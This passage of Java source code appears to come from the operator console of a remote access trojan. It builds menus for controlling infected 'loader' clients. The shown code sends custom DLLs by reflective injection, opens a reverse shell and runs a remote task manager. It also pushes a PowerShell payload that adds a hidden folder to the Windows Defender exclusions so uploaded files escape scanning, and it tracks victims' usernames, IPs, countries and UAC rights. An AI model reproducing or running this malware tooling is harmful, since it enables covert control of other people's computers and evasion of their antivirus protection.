				ServerThread s = new ServerThread(Server.LoaderClients.get(index), "DLL Loader Client"); s.clear();
				Log("Connection Closed for Client ID : " + String.valueOf(index));
			}
				
		});
	    
	    JMenuItem customDLL = new JMenuItem(" Send Custom DLL" );
	    customDLL.setFont(new Font("Calibri", Font.PLAIN, 13));
	    customDLL.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(loaderTable.getSelectionModel().isSelectionEmpty()) {
					Log("No Loader Client has been Selected.");
				} else {
					int index = loaderTable.getSelectedRow(); 
					
					ReflectiveDLLInjection rfWindow = new ReflectiveDLLInjection();
					
					rfWindow.CLIENTSOCKET = Server.LoaderClients.get(index);
					rfWindow.infoLbl.setText("for Loader ID " + String.valueOf(index) + " " +Server.UserPC.get(index));
					ReflectiveDLLInjection.s.setText("");
					rfWindow.setVisible(true);
				}
			}
		});
	    
	    JMenuItem loaderMG = new JMenuItem(" Task Manager");
	    loaderMG.setFont(new Font("Calibri", Font.PLAIN, 13));
	    loaderMG.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(loaderTable.getSelectionModel().isSelectionEmpty()) {
					Log("No Loader Client has been Selected.");
				} else {
					int index = loaderTable.getSelectedRow(); 
					Server.SendData(Server.LoaderClients.get(index), "taskls");
					ServerThread.WaitForReply();
					TaskMgr mgr = new TaskMgr(1);
					TaskMgr.LOADER_ID = index;
					TaskMgr.CLIENT_ID = -1;
					mgr.setVisible(true);
				}
			}
		});
	    
	    JMenuItem Loadershell = new JMenuItem(" Reverse Shell" );
	    Loadershell.setFont(new Font("Calibri", Font.PLAIN, 13));
	    Loadershell.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(loaderTable.getSelectionModel().isSelectionEmpty()) {
					Log("No Client has been Selected.");
				} else {
					Shell rshell = new Shell();
					int index = loaderTable.getSelectedRow();
					rshell.CLIENTSOCKET = Server.LoaderClients.get(index); // 
					rshell.interact.setText("Reverse Shell for Loader ID : " + String.valueOf(index) + " @ " + Server.UserPC.get(index) + " running " + Server.OperatingSystem.get(index));
					Log("Accessing Reverse Shell for Loader ID : " + String.valueOf(index));
					rshell.setVisible(true);	
				}
			}
	    });
	    
	    JMenuItem addExclude = new JMenuItem(" Add Windows Defender Exclusions" );
	    addExclude.setToolTipText("Add Windows Defender Exclusions.");
	    addExclude.setFont(new Font("Calibri", Font.PLAIN, 13));
	    addExclude.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(loaderTable.getSelectionModel().isSelectionEmpty()) {
					Log("No Loader Client has been Selected.");
				} else {
					int index = loaderTable.getSelectedRow(); 
					String strID = String.valueOf(index);
					Socket CLIENTSOCKET = Server.LoaderClients.get(index);
					int n = JOptionPane.showConfirmDialog(null, "The following feature will :\n- Add Windows Defender Exclusions to a hidden Path.\nMake sure the Client has UAC rights! This will not WORK without it! Click YES to continue or NO to cancel.", "Add Windows Defender Exclusions", JOptionPane.YES_NO_OPTION);
					if(n == JOptionPane.NO_OPTION)
					{
						Log("Add Windows Defender Exclusions canceled on Loader ID : " +strID + ".");
					} else {
						Log("Starting Add Windows Defender Exclusions on Loader ID : " + strID + ".");
						// First, Ask A Folder name.
						String fdname = JOptionPane.showInputDialog(null, "Enter a Folder name : ");
						if(fdname.length() > 0)
						{
							Log("Checking if Loader ID " + strID + " has UAC rights.");
							
							String UACValue = loaderTable.getValueAt(index, 10).toString();
							if(UACValue.equals("TRUE"))
							{
								// ok
								
								Shell rshell = new Shell();
								
								rshell.CLIENTSOCKET = CLIENTSOCKET;
								rshell.interact.setText("Sending Payload in Reverse Shell on Loader ID : " + String.valueOf(index) + " @ " + Server.UserPC.get(index) + " running " + Server.OperatingSystem.get(index));
								Log("Accessing Reverse Shell for Loader ID : " + String.valueOf(index));
								rshell.setVisible(true);	
								//x.ShellInput.setEditable(false);
								
								String userName = Server.UserPC.get(index).replace(" ", "").split("/")[0];
								
								
								String FullPath = Persist.InstallFolder(userName, fdname);
								
								String payload = "cmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath '" + FullPath + "'" ;
								String checkPayload = "cmd.exe /c powershell.exe -c " +  '"' + "Get-MpPreference | Select-Object -Property ExclusionPath" + '"';
								Log("Executing Powershell Payload on Loader ID " + strID);
								
								rshell.ShellInput.setText(payload);
								rshell.ShellGo.doClick();
								
								try {
									TimeUnit.SECONDS.sleep(3);
								} catch (InterruptedException e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								}
								
								Log("Checking if Exclusion was added.");
								
								rshell.ShellOutput.setText(""); // clear shell
								//rshell.ShellInput.setText(checkPayload);
								//rshell.ShellGo.doClick();
								Server.SendData(CLIENTSOCKET, checkPayload);
								//ServerThread.WaitForReply();
								rshell.dispose();
								HaltAllSystems();
								try {
									TimeUnit.SECONDS.sleep(3);
								} catch (InterruptedException e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								}
								
								String output = rshell.ShellOutput.getText().strip();
								
								if(output.contains("ExclusionPath"))
								{
									String Exc = output.substring(output.indexOf("{")+1, output.indexOf("}"));
									String ExcW = Exc.replace(",", ", ");
									
									if(ExcW.contains(FullPath)) {
										Log(output);
										JOptionPane.showMessageDialog(null, "Success!"
												+ "\nAdded Windows Defender Exclusion to Path : " + FullPath
												+ "\nWindows Defender Exclusion List : "
												+ "\n( " + ExcW 
												+ ")\nUpload your files to : " + FullPath);
									
									} else {
										JOptionPane.showMessageDialog(null, "Error adding Windows Exclusion. The Exclusion List is currently : \n- " + ExcW);
									}
									
								} else {
									JOptionPane.showMessageDialog(null, "Error, Invalid Payload output was returned by " + userName+". Check Logs and if the problem persists, Report to developer.");
									Log("Invalid output returned : \n");
									Log(output);
								}

								EnableAllSystems();
								//System.out.println("Add Windows Defender Exclusions Defender Exclusion Check OUTPUT : ");
								//Log(output);
								//System.out.println(output);
								
								
								
							} else {
								JOptionPane.showMessageDialog(null, "Add Windows Defender Exclusions Error.\n\nThe Loader does not have UAC Rights, Adding Windows Defender Exclusions will fail. Cannot continue.");
							}
						}
					}
				}
			}
		});
	    
	    JMenuItem WinList = new JMenuItem(" Windows Defender Exclusions List" );
	    WinList.setToolTipText("Add Windows Defender Exclusions.");
	    WinList.setFont(new Font("Calibri", Font.PLAIN, 13));
	    WinList.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(loaderTable.getSelectionModel().isSelectionEmpty()) {
					Log("No Loader Client has been Selected.");
				} else {
					int index = loaderTable.getSelectedRow(); 
					String strID = String.valueOf(index);
					Socket CLIENTSOCKET = Server.LoaderClients.get(index);
					Shell rshell = new Shell();
					
					rshell.CLIENTSOCKET = CLIENTSOCKET;
					rshell.interact.setText("Checking Windows Defender Exclusions on : " + String.valueOf(index) + " @ " + Server.UserPC.get(index) + " running " + Server.OperatingSystem.get(index));
					Log("Accessing Reverse Shell for Loader ID : " + String.valueOf(index));
					rshell.setVisible(true);	
					String checkPayload = "cmd.exe /c powershell.exe -c " +  '"' + "Get-MpPreference | Select-Object -Property ExclusionPath" + '"';
					rshell.ShellInput.setText(checkPayload);
					rshell.ShellGo.doClick();
				}
			}
		});
	    
	    JMenuItem uac_prompt = new JMenuItem(" Trigger UAC Prompt For Process");
	    uac_prompt.setToolTipText("Add Windows Defender Exclusions.");
	    uac_prompt.setFont(new Font("Calibri", Font.PLAIN, 13));
	    uac_prompt.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(loaderTable.getSelectionModel().isSelectionEmpty()) {
					Log("No Loader Client has been Selected.");
				} else {
					int index = loaderTable.getSelectedRow(); 
					String strID = String.valueOf(index);
					Socket CLIENTSOCKET = Server.LoaderClients.get(index);
					
				}
			}
		});
	    
	    
	    
	    DLL_Loader.add(probeClient);
	    DLL_Loader.add(customDLL);
	    DLL_Loader.add(loaderMG);
	    
	    DLL_Loader.add(Loadershell);
	    DLL_Loader.add(addExclude);
	    DLL_Loader.add(WinList);
	    DLL_Loader.add(discon);
	    
	    loaderTable = new JTable(loaderModel);
	    addPopup(loaderTable, DLL_Loader);
	    JScrollPane LoaderPane = new JScrollPane(loaderTable); 
	    GroupLayout gl_panel_2 = new GroupLayout(panel_2);
	    gl_panel_2.setHorizontalGroup(
	    	gl_panel_2.createParallelGroup(Alignment.LEADING)
	    		.addComponent(LoaderPane, GroupLayout.DEFAULT_SIZE, 818, Short.MAX_VALUE)
	    );
	    gl_panel_2.setVerticalGroup(
	    	gl_panel_2.createParallelGroup(Alignment.LEADING)
	    		.addComponent(LoaderPane, GroupLayout.DEFAULT_SIZE, 264, Short.MAX_VALUE)
	    );
	    panel_2.setLayout(gl_panel_2);
	    
	    loaderModel.addColumn("Loader ID");
	    loaderModel.addColumn("Client Type");
	    loaderModel.addColumn("Path on disk");
	    loaderModel.addColumn("IP Address");
	    loaderModel.addColumn("Port");
		 
	    loaderModel.addColumn("Username");
	    loaderModel.addColumn("Hostname");
	    loaderModel.addColumn("OS");
	    loaderModel.addColumn("Public IP");
	    loaderModel.addColumn("Country");
	    loaderModel.addColumn("UAC");
	    
	    // ======================================================================================
	    JPanel panel_1 = new JPanel();
	    tabbedPane.addTab("Downloads", null, panel_1, null);
	    
	    dlTable = new JTable(dlModel);
	    tabbedPane.getModel().addChangeListener(new ChangeListener() {
	         @Override
	         public void stateChanged(ChangeEvent e) {
	            //System.out.println("The selected tab is now : " + String.valueOf(tabbedPane.getSelectedIndex()));
	        	 
	        	 // Tab id's
	        	 // Tab ID 0, Connected Probes
	        	 // Tab ID 1, Reflective Loader Handler
	        	 // Tab ID 2, Downloads
	        	 
	        	 int x = tabbedPane.getSelectedIndex();
	        	 if(x == 2) {
	        		 
	        		 ListDownloads.DownloadsList();
	        	 }
	        	 
	         }
	      });
	    
	    JScrollPane table_1 = new JScrollPane(dlTable);
	    GroupLayout gl_panel_1 = new GroupLayout(panel_1);
	    gl_panel_1.setHorizontalGroup(
	    	gl_panel_1.createParallelGroup(Alignment.LEADING)
	    		.addComponent(table_1, GroupLayout.DEFAULT_SIZE, 818, Short.MAX_VALUE)
	    );
	    gl_panel_1.setVerticalGroup(
	    	gl_panel_1.createParallelGroup(Alignment.LEADING)
	    		.addComponent(table_1, Alignment.TRAILING, GroupLayout.DEFAULT_SIZE, 224, Short.MAX_VALUE)
	    );
	    panel_1.setLayout(gl_panel_1);
	    
	    dlModel.addColumn("File");
	    dlModel.addColumn("Path");
	    frmRemoteHackerProbe.getContentPane().setLayout(groupLayout);
	    
	}
	
	public static void addPopup(Component component, final JPopupMenu popup) {
		component.addMouseListener(new MouseAdapter() {
			public void mousePressed(MouseEvent e) {
				if (e.isPopupTrigger()) {
					showMenu(e);
				}
			}
			public void mouseReleased(MouseEvent e) {
				if (e.isPopupTrigger()) {
					showMenu(e);
				}
			}
			private void showMenu(MouseEvent e) {
				popup.show(e.getComponent(), e.getX(), e.getY());
			}
		});
	}
}